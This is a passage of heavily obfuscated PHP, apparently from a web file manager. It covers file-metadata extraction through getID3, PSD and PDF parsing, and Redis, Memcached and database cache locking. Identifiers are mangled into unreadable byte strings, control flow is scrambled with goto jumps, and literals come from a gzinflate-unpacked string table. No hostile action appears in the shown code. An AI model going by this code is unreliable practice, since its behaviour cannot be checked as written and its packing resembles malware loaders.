$F£°×ˆõ™¯, 33), $BğùÜ®ôİ)) { $d§Èíƒ¢Ö = $F—ÙäÈ°©Ò[1608]; $D¼‚èå£³• = intval($BğùÜ®ôİ[1]) . $F—ÙäÈ°©Ò[70] . intval($BğùÜ®ôİ[2]); $F£°×ˆõ™¯ += strlen($BğùÜ®ôİ[0]); } elseif (($E­˜­ŞÔ† = strspn($e©‡Ãğ‰¾“, $F—ÙäÈ°©Ò[1609], $F£°×ˆõ™¯)) > 0) { $d§Èíƒ¢Ö = $F—ÙäÈ°©Ò[1610]; $D¼‚èå£³• = substr($e©‡Ãğ‰¾“, $F£°×ˆõ™¯, $E­˜­ŞÔ†); $F£°×ˆõ™¯ += $E­˜­ŞÔ†; } break; } goto E£¢Å§™Ü; a­•‡°‡¢: $F—ÙäÈ°©Ò =& $_SERVER[Å¸ş]; $d§Èíƒ¢Ö = $F—ÙäÈ°©Ò[33]; $D¼‚èå£³• = $F—ÙäÈ°©Ò[33]; goto Eæöù£ôğ•; EÌÚ¤¸™áŸ: } } class GetInfo { private static $fileTypeArray; public static function get($C•ƒ†¹æÅ) { $dÃ¹êğÇ® = IO::info($C•ƒ†¹æÅ); return self::infoAdd($dÃ¹êğÇ®); } public static function check() { } public static function infoAdd(&$fÃË‰º…ğ•) { goto b¼ Áƒ‰; b¯‰šÊĞ¯ñ: $bá™–º“èè = $fÃË‰º…ğ•[$Aóò†ãŒÆŒ[160]]; try { if ($fÃË‰º…ğ•[$Aóò†ãŒÆŒ[160]] == $Aóò†ãŒÆŒ[1613]) { $Bñ¹¢§ÌŞ = self::psdParse($Fï§ÊÒÑ„Ø); $bá™–º“èè = $Aóò†ãŒÆŒ[1614]; } else { if ($fÃË‰º…ğ•[$Aóò†ãŒÆŒ[160]] == $Aóò†ãŒÆŒ[1615]) { $Bñ¹¢§ÌŞ = self::pdfParse($Fï§ÊÒÑ„Ø); } else { $bá™–º“èè = self::$fileTypeArray[$Aóò†ãŒÆŒ[1616]][$fÃË‰º…ğ•[$Aóò†ãŒÆŒ[160]]]; $EÓ˜™Ïê“† = self::$fileTypeArray[$Aóò†ãŒÆŒ[1617]][$bá™–º“èè][$Aóò†ãŒÆŒ[1618]]; $BÉ®Ü¼ƒî¼ = @$A„ÕÒ…µ->analyze($Fï§ÊÒÑ„Ø, $fÃË‰º…ğ•[$Aóò†ãŒÆŒ[77]], $fÃË‰º…ğ•[$Aóò†ãŒÆŒ[28]]); $Bñ¹¢§ÌŞ = self::parseData($BÉ®Ü¼ƒî¼, $EÓ˜™Ïê“†, $fÃË‰º…ğ•); } } } catch (Exception $B±Œò›ƒ•õ) { $Bñ¹¢§ÌŞ = array($Aóò†ãŒÆŒ[372] => $bá™–º“èè); } if (!$Bñ¹¢§ÌŞ) { return; } goto c‡Ô¥Ä§æ‘; B‹Æ‡ØÚá: if (!$fÃË‰º…ğ• || $fÃË‰º…ğ•[$Aóò†ãŒÆŒ[29]] != $Aóò†ãŒÆŒ[167]) { return; } if (!self::support($fÃË‰º…ğ•[$Aóò†ãŒÆŒ[160]]) || isset($fÃË‰º…ğ•[$Aóò†ãŒÆŒ[426]])) { return; } $Fï§ÊÒÑ„Ø = $Aóò†ãŒÆŒ[1612] . $fÃË‰º…ğ•[$Aóò†ãŒÆŒ[75]]; goto b¯‰šÊĞ¯ñ; b¼ Áƒ‰: $Aóò†ãŒÆŒ =& $_SERVER[Å¸ş]; static $A„ÕÒ…µ; if (!$A„ÕÒ…µ) { require SDK_DIR . $Aóò†ãŒÆŒ[1611]; $A„ÕÒ…µ = new getID3(); } goto B‹Æ‡ØÚá; c‡Ô¥Ä§æ‘: $Bñ¹¢§ÌŞ = self::arrayValueLimit($Bñ¹¢§ÌŞ); $Bñ¹¢§ÌŞ[$Aóò†ãŒÆŒ[372]] = $bá™–º“èè; $fÃË‰º…ğ•[$Aóò†ãŒÆŒ[426]] = $Bñ¹¢§ÌŞ; goto c‘Ã‹ÆàŒ‹; c‘Ã‹ÆàŒ‹: return $fÃË‰º…ğ•; goto aÍƒ‰å£Š…; aÍƒ‰å£Š…: } public static function support($c†ÈåÖŒÒ´) { goto e‘†°­Ó³; díÙô…Ş–Ú: return !1; goto BÛ’…ª¨İÆ; e‘†°­Ó³: $AÒ…™“¯…Œ =& $_SERVER[Å¸ş]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $c†ÈåÖŒÒ´ = strtolower($c†ÈåÖŒÒ´); goto A®„í˜Ãà‰; A®„í˜Ãà‰: $dóºëÎÔ = array($AÒ…™“¯…Œ[1615], $AÒ…™“¯…Œ[1613]); if (in_array($c†ÈåÖŒÒ´, $dóºëÎÔ)) { return !0; } if (isset(self::$fileTypeArray[$AÒ…™“¯…Œ[1616]][$c†ÈåÖŒÒ´])) { return !0; } goto díÙô…Ş–Ú; BÛ’…ª¨İÆ: } public static function arrayValueLimit($cñ®“à®, $d«°¤¼¿á¥ = 5000) { if (!is_array($cñ®“à®)) { return $cñ®“à®; } foreach ($cñ®“à® as $f„œ‘šá–‚ => $EİÇÔ‚„) { if (is_string($EİÇÔ‚„) && strlen($EİÇÔ‚„) > $d«°¤¼¿á¥) { $cñ®“à®[$f„œ‘šá–‚] = substr($EİÇÔ‚„, 0, $d«°¤¼¿á¥); } else { if (is_array($EİÇÔ‚„)) { $cñ®“à®[$f„œ‘šá–‚] = self::arrayValueLimit($EİÇÔ‚„, $d«°¤¼¿á¥); } } } return $cñ®“à®; } private static function parseData($d¦ˆ”ó¸Ú, $B‡Úó™ëâƒ, $AÒÁ÷±äŠ) { $Dö¶ÆìÌå¦ =& $_SERVER[Å¸ş]; $F†¹ÚÅ„½ã = $d¦ˆ”ó¸Ú[$Dö¶ÆìÌå¦[1619]]; $AÉÒ¸…¸Ñ = array(); foreach ($B‡Úó™ëâƒ as $FˆÕ¢·‰ ã => $e™ÛàÆÇÔĞ) { foreach ($e™ÛàÆÇÔĞ as $AœÑ®Üù°ß) { if (is_array($AœÑ®Üù°ß)) { $bß•¸î—Î = self::parseData($d¦ˆ”ó¸Ú, $e™ÛàÆÇÔĞ, $AÒÁ÷±äŠ); if ($bß•¸î—Î) { $AÉÒ¸…¸Ñ[$FˆÕ¢·‰ ã] = $bß•¸î—Î; } break; } $eí÷Á ²è– = str_replace($Dö¶ÆìÌå¦[1389], $F†¹ÚÅ„½ã, $AœÑ®Üù°ß); $bß•¸î—Î = _get($d¦ˆ”ó¸Ú, $eí÷Á ²è–); $bß•¸î—Î = is_array($bß•¸î—Î) ? $bß•¸î—Î[0] : $bß•¸î—Î; if ($bß•¸î—Î) { break; } } if ($bß•¸î—Î || $bß•¸î—Î === 0 || $bß•¸î—Î === !1) { $bß•¸î—Î = self::valueReset($AœÑ®Üù°ß, $bß•¸î—Î, $FˆÕ¢·‰ ã); if ($bß•¸î—Î !== null) { $AÉÒ¸…¸Ñ[$FˆÕ¢·‰ ã] = $bß•¸î—Î; } } } $AÉÒ¸…¸Ñ = self::valueResetAll($AÉÒ¸…¸Ñ, $AÒÁ÷±äŠ); return $AÉÒ¸…¸Ñ; } private static function psdParse($a¥¸Ÿ—Í‰) { $BŠŒºÆÄ£š =& $_SERVER[Å¸ş]; if (IO::fileSubstr($a¥¸Ÿ—Í‰, 0, 4) != $BŠŒºÆÄ£š[1620]) { return !1; } $b™èèÁî¿× = getImageSize($a¥¸Ÿ—Í‰, $aß¨×­Æå); if (!$b™èèÁî¿×) { return; } $FƒòÚâ¼©‹ = array($BŠŒºÆÄ£š[1535] => $b™èèÁî¿×[0], $BŠŒºÆÄ£š[1537] => $b™èèÁî¿×[1]); return $FƒòÚâ¼©‹; } private static function pdfParse($eÕ¹³´„‹Š) { return FileParsePdf::parse($eÕ¹³´„‹Š); } private static function fileTypeParse() { $eª„ˆÇœ°Ó =& $_SERVER[Å¸ş]; $a‰ƒó¥è¬ø = self::fileTypeArray(); $aÇÓŠËÓ‘ = array(); foreach ($a‰ƒó¥è¬ø as $B¥Şƒù¾Ëà => $E†¿ÂÉÑôİ) { $AÆÔ·¸ÊÜõ = _get($E†¿ÂÉÑôİ, $eª„ˆÇœ°Ó[160], $eª„ˆÇœ°Ó[33]); $f†ğª¸ŸŞ = is_string($AÆÔ·¸ÊÜõ) ? explode($eª„ˆÇœ°Ó[47], $AÆÔ·¸ÊÜõ) : $AÆÔ·¸ÊÜõ; if (!$f†ğª¸ŸŞ) { continue; } foreach ($f†ğª¸ŸŞ as $AÆÔ·¸ÊÜõ) { $AÆÔ·¸ÊÜõ = strtolower(trim($AÆÔ·¸ÊÜõ)); if (!$AÆÔ·¸ÊÜõ) { continue; } $aÇÓŠËÓ‘[$AÆÔ·¸ÊÜõ] = $B¥Şƒù¾Ëà; } $a‰ƒó¥è¬ø[$B¥Şƒù¾Ëà][$eª„ˆÇœ°Ó[160]] = array_keys($aÇÓŠËÓ‘); $a‰ƒó¥è¬ø[$B¥Şƒù¾Ëà][$eª„ˆÇœ°Ó[1618]] = self::parseKeyMap($E†¿ÂÉÑôİ[$eª„ˆÇœ°Ó[1618]]); } return array($eª„ˆÇœ°Ó[1617] => $a‰ƒó¥è¬ø, $eª„ˆÇœ°Ó[1616] => $aÇÓŠËÓ‘); } private static function parseKeyMap($báˆëÂŞÄ) { $AÙ´Ò¹É×« =& $_SERVER[Å¸ş]; foreach ($báˆëÂŞÄ as $AÔ¼ëŒÍµÍ => $cô¶‹é±Ö³) { if (is_array($cô¶‹é±Ö³)) { $fÏæ´™“±‚ = self::parseKeyMap($cô¶‹é±Ö³); if ($fÏæ´™“±‚) { $báˆëÂŞÄ[$AÔ¼ëŒÍµÍ] = $fÏæ´™“±‚; } continue; } $bÇŸ¨©…ª = explode($AÙ´Ò¹É×«[47], $cô¶‹é±Ö³); $BøÏ¤‡·ˆÔ = array(); foreach ($bÇŸ¨©…ª as $AØµ¹™ò•) { $AØµ¹™ò• = trim($AØµ¹™ò•); if (!$AØµ¹™ò•) { continue; } if (preg_match($AÙ´Ò¹É×«[1621], $AØµ¹™ò•, $b¯‰œĞÕ÷‘)) { $eöÔíÈÔÜî = explode($AÙ´Ò¹É×«[271], $b¯‰œĞÕ÷‘[1]); foreach ($eöÔíÈÔÜî as $eù£‡«¾ªĞ) { $BøÏ¤‡·ˆÔ[] = str_replace($b¯‰œĞÕ÷‘[0], $eù£‡«¾ªĞ, $AØµ¹™ò•); } } else { $BøÏ¤‡·ˆÔ[] = $AØµ¹™ò•; } } $báˆëÂŞÄ[$AÔ¼ëŒÍµÍ] = $BøÏ¤‡·ˆÔ; } return $báˆëÂŞÄ; } private static function valueResetAll($F¬ŞÂ“¼æ½, $aÉŒà•é§) { goto EŒ¨‡½¯‹É; cšíÀÕÊ¬á: $dÙë‡¦˜ÙÏ = _get($F¬ŞÂ“¼æ½, $c• º‚ŠÂÙ[1634], $c• º‚ŠÂÙ[33]); $Fõ¤††ğ£· = $bÛ×¦‚ÀŸè . $C¢ÎÓ¬§Ÿ . $dÙë‡¦˜ÙÏ; if ($Fõ¤††ğ£· && get_charset($Fõ¤††ğ£·) != $c• º‚ŠÂÙ[326]) { $F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1631]][$c• º‚ŠÂÙ[1340]] = iconv_to($F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1631]][$c• º‚ŠÂÙ[1340]], get_charset($Fõ¤††ğ£·), $c• º‚ŠÂÙ[326]); $F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1631]][$c• º‚ŠÂÙ[1635]] = iconv_to($F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1631]][$c• º‚ŠÂÙ[1635]], get_charset($Fõ¤††ğ£·), $c• º‚ŠÂÙ[326]); $F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1631]][$c• º‚ŠÂÙ[1636]] = iconv_to($F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1631]][$c• º‚ŠÂÙ[1636]], get_charset($Fõ¤††ğ£·), $c• º‚ŠÂÙ[326]); } goto FùÙ¸ùœ¡; EŒ¨‡½¯‹É: $c• º‚ŠÂÙ =& $_SERVER[Å¸ş]; if (isset($F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1622]])) { $c•èç——ê‘ = ceil($F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1622]]); $BÁ¯èÉå¢¹ = intval($c•èç——ê‘ / 3600); $bíŸ†‘‹á” = intval(($c•èç——ê‘ - $BÁ¯èÉå¢¹ * 3600) / 60); $Eè¹¸”‘¡÷ = $c•èç——ê‘ % 60; $F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1623]] = sprintf($c• º‚ŠÂÙ[1624], $BÁ¯èÉå¢¹, $bíŸ†‘‹á”, $Eè¹¸”‘¡÷); if ($BÁ¯èÉå¢¹ == 0) { $F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1623]] = sprintf($c• º‚ŠÂÙ[1625], $bíŸ†‘‹á”, $Eè¹¸”‘¡÷); } } $E‡ğÑ¡ª¶ = _get($F¬ŞÂ“¼æ½, $c• º‚ŠÂÙ[1626]); goto dÃé¥§Íİ; dÃé¥§Íİ: if ($E‡ğÑ¡ª¶) { $aë‘íËŠÊì = IO_PATH_SYSTEM_TEMP . $c• º‚ŠÂÙ[1627] . KodIO::hashPath($aÉŒà•é§) . $c• º‚ŠÂÙ[1628]; $F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1629]] = Action($c• º‚ŠÂÙ[1630])->pluginCacheFileSet($aë‘íËŠÊì, $E‡ğÑ¡ª¶); unset($F¬ŞÂ“¼æ½[$c• º‚ŠÂÙ[1631]][$c• º‚ŠÂÙ[1614]]); } $bÛ×¦‚ÀŸè = _get($F¬ŞÂ“¼æ½, $c• º‚ŠÂÙ[1632], $c• º‚ŠÂÙ[33]); $C¢ÎÓ¬§Ÿ = _get($F¬ŞÂ“¼æ½, $c• º‚ŠÂÙ[1633], $c• º‚ŠÂÙ[33]); goto cšíÀÕÊ¬á; FùÙ¸ùœ¡: return $F¬ŞÂ“¼æ½; goto bê×‘×ç¿—; bê×‘×ç¿—: } private static function valueReset($Eî·×¦ù‘™, $E¾„Ä™»Šô, $EßÏ‰¿‘¨ä) { $Aõ¸¨¥Ûç =& $_SERVER[Å¸ş]; $EÅê‘·¼¼í = $Aõ¸¨¥Ûç[1552]; switch ($Eî·×¦ù‘™) { case $Aõ¸¨¥Ûç[1637]: $E¾„Ä™»Šô = $E¾„Ä™»Šô == $Aõ¸¨¥Ûç[83] ? $Aõ¸¨¥Ûç[1638] : $Aõ¸¨¥Ûç[1639]; break; case $Aõ¸¨¥Ûç[1640]: $E¾„Ä™»Šô = $E¾„Ä™»Šô ? $E¾„Ä™»Šô : null; break; default: break; } switch ($EßÏ‰¿‘¨ä) { case $Aõ¸¨¥Ûç[1641]: $E¾„Ä™»Šô = round($E¾„Ä™»Šô, 2); break; case $Aõ¸¨¥Ûç[187]: case $Aõ¸¨¥Ûç[107]: if ($E¾„Ä™»Šô < 0) { $E¾„Ä™»Šô = null; } else { if (is_numeric($E¾„Ä™»Šô)) { $E¾„Ä™»Šô = date($EÅê‘·¼¼í, $E¾„Ä™»Šô); } } break; default: break; } return $E¾„Ä™»Šô; } private static function fileTypeArray() { $C¾ôà»è¦á =& $_SERVER[Å¸ş]; return array($C¾ôà»è¦á[1614] => array($C¾ôà»è¦á[160] => $C¾ôà»è¦á[1642] . $C¾ôà»è¦á[1643], $C¾ôà»è¦á[1618] => array($C¾ôà»è¦á[1535] => $C¾ôà»è¦á[1644], $C¾ôà»è¦á[1537] => $C¾ôà»è¦á[1645], $C¾ôà»è¦á[1646] => $C¾ôà»è¦á[1647], $C¾ôà»è¦á[1648] => $C¾ôà»è¦á[1649], $C¾ôà»è¦á[187] => $C¾ôà»è¦á[1650], $C¾ôà»è¦á[107] => $C¾ôà»è¦á[1651], $C¾ôà»è¦á[1652] => $C¾ôà»è¦á[1653], $C¾ôà»è¦á[1654] => $C¾ôà»è¦á[1655], $C¾ôà»è¦á[1656] => $C¾ôà»è¦á[1657], $C¾ôà»è¦á[1658] => $C¾ôà»è¦á[1659], $C¾ôà»è¦á[1660] => $C¾ôà»è¦á[1661], $C¾ôà»è¦á[1662] => $C¾ôà»è¦á[1663], $C¾ôà»è¦á[1664] => $C¾ôà»è¦á[1665], $C¾ôà»è¦á[1666] => array($C¾ôà»è¦á[1667] => $C¾ôà»è¦á[1668], $C¾ôà»è¦á[1669] => $C¾ôà»è¦á[1670], $C¾ôà»è¦á[1671] => $C¾ôà»è¦á[1672]), $C¾ôà»è¦á[1673] => $C¾ôà»è¦á[1674], $C¾ôà»è¦á[1675] => $C¾ôà»è¦á[1676], $C¾ôà»è¦á[1677] => $C¾ôà»è¦á[1678], $C¾ôà»è¦á[1679] => $C¾ôà»è¦á[1680], $C¾ôà»è¦á[1681] => array($C¾ôà»è¦á[1682] => $C¾ôà»è¦á[1683], $C¾ôà»è¦á[1684] => $C¾ôà»è¦á[1685], $C¾ôà»è¦á[1686] => $C¾ôà»è¦á[1687], $C¾ôà»è¦á[1688] => $C¾ôà»è¦á[1689], $C¾ôà»è¦á[1690] => $C¾ôà»è¦á[1691], $C¾ôà»è¦á[1692] => $C¾ôà»è¦á[1693], $C¾ôà»è¦á[1694] => $C¾ôà»è¦á[1695], $C¾ôà»è¦á[1696] => $C¾ôà»è¦á[1697], $C¾ôà»è¦á[1698] => $C¾ôà»è¦á[1699], $C¾ôà»è¦á[1700] => $C¾ôà»è¦á[1701], $C¾ôà»è¦á[1702] => $C¾ôà»è¦á[1703]))), $C¾ôà»è¦á[1704] => array($C¾ôà»è¦á[160] => $C¾ôà»è¦á[1705] . $C¾ôà»è¦á[1706], $C¾ôà»è¦á[1618] => array($C¾ôà»è¦á[1622] => $C¾ôà»è¦á[1707], $C¾ôà»è¦á[187] => $C¾ôà»è¦á[1708], $C¾ôà»è¦á[107] => $C¾ôà»è¦á[1709], $C¾ôà»è¦á[1654] => $C¾ôà»è¦á[1710], $C¾ôà»è¦á[1711] => $C¾ôà»è¦á[1712], $C¾ôà»è¦á[1713] => $C¾ôà»è¦á[1640], $C¾ôà»è¦á[1714] => $C¾ôà»è¦á[1715], $C¾ôà»è¦á[1716] => $C¾ôà»è¦á[1717], $C¾ôà»è¦á[1718] => $C¾ôà»è¦á[1719], $C¾ôà»è¦á[1631] => array($C¾ôà»è¦á[1340] => $C¾ôà»è¦á[1720], $C¾ôà»è¦á[1635] => $C¾ôà»è¦á[1721], $C¾ôà»è¦á[1636] => $C¾ôà»è¦á[1722], $C¾ôà»è¦á[1723] => $C¾ôà»è¦á[1724], $C¾ôà»è¦á[1725] => $C¾ôà»è¦á[1726], $C¾ôà»è¦á[1727] => $C¾ôà»è¦á[1728], $C¾ôà»è¦á[1614] => $C¾ôà»è¦á[1729]))), $C¾ôà»è¦á[1730] => array($C¾ôà»è¦á[160] => $C¾ôà»è¦á[1731] . $C¾ôà»è¦á[1732], $C¾ôà»è¦á[1618] => array($C¾ôà»è¦á[1535] => $C¾ôà»è¦á[1733], $C¾ôà»è¦á[1537] => $C¾ôà»è¦á[1734], $C¾ôà»è¦á[1622] => $C¾ôà»è¦á[1707], $C¾ôà»è¦á[187] => $C¾ôà»è¦á[1735], $C¾ôà»è¦á[107] => $C¾ôà»è¦á[1736], $C¾ôà»è¦á[1641] => $C¾ôà»è¦á[1737], $C¾ôà»è¦á[1718] => $C¾ôà»è¦á[1738], $C¾ôà»è¦á[1714] => $C¾ôà»è¦á[1739], $C¾ôà»è¦á[1654] => $C¾ôà»è¦á[1740], $C¾ôà»è¦á[1704] => array($C¾ôà»è¦á[1713] => $C¾ôà»è¦á[1640], $C¾ôà»è¦á[1741] => $C¾ôà»è¦á[1742], $C¾ôà»è¦á[1711] => $C¾ôà»è¦á[1712], $C¾ôà»è¦á[1718] => $C¾ôà»è¦á[1719], $C¾ôà»è¦á[1714] => $C¾ôà»è¦á[1743], $C¾ôà»è¦á[1716] => $C¾ôà»è¦á[1717]))), $C¾ôà»è¦á[1744] => array($C¾ôà»è¦á[1618] => array($C¾ôà»è¦á[1745] => $C¾ôà»è¦á[1746], $C¾ôà»è¦á[1747] => $C¾ôà»è¦á[1748])), $C¾ôà»è¦á[1749] => array($C¾ôà»è¦á[1618] => array())); } } function exif_read_data_io($eêä¬éÅù, $B¾Ğ®ÖªÌÁ = null, $F¤Ã¸×²°¬ = false, $Eô“÷‚—ÌŒ = false) { $D‘Õ¨ÇÑ•„ = StreamWrapperIO::read($eêä¬éÅù, 0, 1024 * 64); $bùŸÖïö²ù = $_SERVER[Å¸ş][1750] . base64_encode($D‘Õ¨ÇÑ•„); return exif_read_data($bùŸÖïö²ù, $B¾Ğ®ÖªÌÁ, $F¤Ã¸×²°¬, $Eô“÷‚—ÌŒ); } goto cò­çØÙŠ; DÌ©‚Ø°–¢: $A£ğˆ©‚œ = $_SERVER[Å¸ş][549]; while ($A£ğˆ©‚œ < $_SERVER[Å¸ş][550]) { if ($A£ğˆ©‚œ >= 0) { break; } $A£ğˆ©‚œ++; } $_SERVER[ÀÌîòš£] = explode($_SERVER[Å¸ş][551], gzinflate(substr($_SERVER[Å¸ş][552], 10, -8))); goto eëí«Ì—Á; E²ƒ“ÉÖó†: class CacheLockRedis { public function lock($Cà¤‰ãÚñù, $a¹¢Ü¦¿³á = 10) { $f‹º¨íÜ¡º = Cache::init(); $DĞè˜øõÜİ = microtime(!0) + $a¹¢Ü¦¿³á; while (microtime(!0) < $DĞè˜øõÜİ) { $F´ºùˆˆé‚ = $f‹º¨íÜ¡º->get($Cà¤‰ãÚñù); if (!$F´ºùˆˆé‚) { $Bª¨ÓÓ» = $f‹º¨íÜ¡º->setLock($Cà¤‰ãÚñù, $DĞè˜øõÜİ, $a¹¢Ü¦¿³á); if ($Bª¨ÓÓ») { return !0; } } else { if ($F´ºùˆˆé‚ < microtime(!0)) { $f‹º¨íÜ¡º->set($Cà¤‰ãÚñù, $DĞè˜øõÜİ, $DĞè˜øõÜİ); if ($f‹º¨íÜ¡º->get($Cà¤‰ãÚñù) === $F´ºùˆˆé‚) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($fâ‹ÇÖŠá) { return Cache::init()->get($fâ‹ÇÖŠá); } public function unlock($aäŸ×‰ìœÇ) { return Cache::init()->remove($aäŸ×‰ìœÇ); } } class CacheLockMemcached { public function lock($fÅÄì†…ƒ, $aàİ¹Ğ©Ë‚ = 0) { $D…¾Ã¹£ÓÊ = Cache::init(); $e¦¡ŞÂ´ŒØ = microtime(!0) + $aàİ¹Ğ©Ë‚; while (microtime(!0) < $e¦¡ŞÂ´ŒØ) { $C†¯šÈÁÜ = $D…¾Ã¹£ÓÊ->get($fÅÄì†…ƒ); if (!$C†¯šÈÁÜ || $C†¯šÈÁÜ < microtime(!0)) { $d·Ñ åÀ± = $D…¾Ã¹£ÓÊ->handle->add($fÅÄì†…ƒ, $e¦¡ŞÂ´ŒØ, $aàİ¹Ğ©Ë‚); if ($d·Ñ åÀ±) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($a‚«­ÔÂó) { return Cache::init()->get($a‚«­ÔÂó); } public function unlock($f–àŠ´¨ À) { return Cache::init()->remove($f–àŠ´¨ À); } } class CacheLockDatabase { public function lock($bˆÀŞä±ˆ, $Cò¸…„ãÉ = 0) { $f‘ªíÔŠ = Model($_SERVER[Å¸ş][759]); $C®ïµ†İŠ = microtime(!0) + $Cò¸…„ãÉ; while (microtime(!0) < $C®ïµ†İŠ) { $c»©ˆ¬Ç³± = $f‘ªíÔŠ->get($bˆÀŞä±ˆ); if (!$c»©ˆ¬Ç³± || $c»©ˆ¬Ç³± < microtime(!0)) { $fÊ£‘½ÈÊ = $f‘ªíÔŠ->set($bˆÀŞä±ˆ, $C®ïµ†İŠ); if ($fÊ£‘½ÈÊ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($b‹Ä†–‚œ) { return Model($_SERVER[Å¸ş][759])->get($b‹Ä†–‚œ); } public function unlock($D¡¤¡ÖÜµØ) { Model($_SERVER[Å¸ş][759])->remove($D¡¤¡ÖÜµØ); } } goto f²Í¥öƒå; f„Ô¼˜ö™: define($_SERVER[Å¸ş][1939], 5); define($_SERVER[Å¸ş][1940], 16); define($_SERVER[Å¸ş][1941], 32); goto cˆ‰İ–ˆ¿; f²Í¥öƒå: class CacheMemcached { public $handle; public $cacheTime; public function __construct($D‰™óÃŒèí, $AòŠˆÑôÈ¥) { $FÎ°‰õïÍŞ =& $_SERVER[Å¸ş]; if (!class_exists($FÎ°‰õïÍŞ[780])) { show_json($FÎ°‰õïÍŞ[781], !1); } $this->cacheTime = $AòŠˆÑôÈ¥; $this->handle = new Memcached(); if (is_array($D‰™óÃŒèí[$FÎ°‰õïÍŞ[782]]) && count($D‰™óÃŒèí[$FÎ°‰õïÍŞ[782]]) >= 1) { foreach ($D‰™óÃŒèí[$FÎ°‰õïÍŞ[782]] as $EìŒ•ëŠŞ¤) { $CÎŞ„¥À±” = explode($FÎ°‰õïÍŞ[4], $EìŒ•ëŠŞ¤); $this->handle->addServer($CÎŞ„¥À±”[0], $CÎŞ„¥À±”[1]); } } else { $this->handle->addServer($D‰™óÃŒèí[$FÎ°‰õïÍŞ[169]], $D‰™óÃŒèí[$FÎ°‰õïÍŞ[170]]); } } public function set($D•°†»¥‡Ğ, $f¨ÉÛ…ÏŸ, $AÃœµ‚ëíÏ = false) { $AÃœµ‚ëíÏ = $AÃœµ‚ëíÏ ? $AÃœµ‚ëíÏ : $this->cacheTime; return $this->handle->set($D•°†»¥‡Ğ, $f¨ÉÛ…ÏŸ, $AÃœµ‚ëíÏ); } public function get($b”¯»ÏŠÕ’) { return $this->handle->get($b”¯»ÏŠÕ’); } public function remove($e²èí¦ğÏœ) { return $this->handle->delete($e²èí¦ğÏœ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($fÅ¨ÉåÚ„À, $fƒĞñÒ†éÆ) { $dï¡Â‚µ–Ò =& $_SERVER[Å¸ş]; if (!class_exists($dï¡Â‚µ–Ò[783])) { show_json($dï¡Â‚µ–Ò[784], !1); } $this->cacheTime = $fƒĞñÒ†éÆ; $D›¸Ê¤Ê = isset($fÅ¨ÉåÚ„À[$dï¡Â‚µ–Ò[785]]) ? $fÅ¨ÉåÚ„À[$dï¡Â‚µ–Ò[785]] : 10; $eÌ¯‘©ÙÙ = _get($fÅ¨ÉåÚ„À, $dï¡Â‚µ–Ò[782]); if ($eÌ¯‘©ÙÙ && is_array($eÌ¯‘©ÙÙ)) { $this->initCluster($fÅ¨ÉåÚ„À, $D›¸Ê¤Ê); } else { $this->handle = $this->init($fÅ¨ÉåÚ„À, $D›¸Ê¤Ê); } } private function init($cæ»ƒÃÖÕ, $DÄ‰Û†ùø) { $cÉÕ‚¢Èªƒ =& $_SERVER[Å¸ş]; $CäÖÚ‹äÓƒ = new Redis(); $eˆÍÍ‰¨Â = isset($cæ»ƒÃÖÕ[$cÉÕ‚¢Èªƒ[786]]) ? $cæ»ƒÃÖÕ[$cÉÕ‚¢Èªƒ[786]] : !1; if ($eˆÍÍ‰¨Â) { $CäÖÚ‹äÓƒ->pconnect($cæ»ƒÃÖÕ[$cÉÕ‚¢Èªƒ[169]], $cæ»ƒÃÖÕ[$cÉÕ‚¢Èªƒ[170]], $DÄ‰Û†ùø); } else { $CäÖÚ‹äÓƒ->connect($cæ»ƒÃÖÕ[$cÉÕ‚¢Èªƒ[169]], $cæ»ƒÃÖÕ[$cÉÕ‚¢Èªƒ[170]], $DÄ‰Û†ùø); } if (!empty($cæ»ƒÃÖÕ[$cÉÕ‚¢Èªƒ[376]])) { $CäÖÚ‹äÓƒ->auth($cæ»ƒÃÖÕ[$cÉÕ‚¢Èªƒ[376]]); } return $CäÖÚ‹äÓƒ; } private function initCluster($B‚«†è‘Ì, $aœÄó¯Ç¾) { $aÑâ¤Œõ¤ =& $_SERVER[Å¸ş]; $C›´ƒª¨±² = array($aÑâ¤Œõ¤[787], $aÑâ¤Œõ¤[788], $aÑâ¤Œõ¤[789]); $aÎ‚ßíãêÛ = $aÑâ¤Œõ¤[787]; if (isset($B‚«†è‘Ì[$aÑâ¤Œõ¤[12]]) && in_array($B‚«†è‘Ì[$aÑâ¤Œõ¤[12]], $C›´ƒª¨±²)) { $aÎ‚ßíãêÛ = $B‚«†è‘Ì[$aÑâ¤Œõ¤[12]]; } switch ($aÎ‚ßíãêÛ) { case $aÑâ¤Œõ¤[787]: $this->_slave($B‚«†è‘Ì, $aœÄó¯Ç¾); break; case $aÑâ¤Œõ¤[788]: break; case $aÑâ¤Œõ¤[789]: $this->isCluster = !0; $A„§ñ ŸĞ› = $B‚«†è‘Ì[$aÑâ¤Œõ¤[782]]; $bàŞ¤æŞîÒ = isset($B‚«†è‘Ì[$aÑâ¤Œõ¤[786]]) ? $B‚«†è‘Ì[$aÑâ¤Œõ¤[786]] : !1; $dĞÍå´ê§ö = isset($B‚«†è‘Ì[$aÑâ¤Œõ¤[376]]) ? $B‚«†è‘Ì[$aÑâ¤Œõ¤[376]] : null; $this->handle = new RedisCluster(NUll, $A„§ñ ŸĞ›, $aœÄó¯Ç¾, $aœÄó¯Ç¾, $bàŞ¤æŞîÒ, $dĞÍå´ê§ö); break; default: break; } } private function _slave($B½å’£ìÈã, $d´šµ¦ˆ£†) { goto Dƒô¦¼…; a˜Œ…£Èôï: unset($e¡ÎÄİÚñ[0]); if (empty($e¡ÎÄİÚñ)) { return; } $eøƒ÷½‘ = array_rand($e¡ÎÄİÚñ); goto aå‚×İÍ¹¦; Dƒô¦¼…: $e¡ÎÄİÚñ = 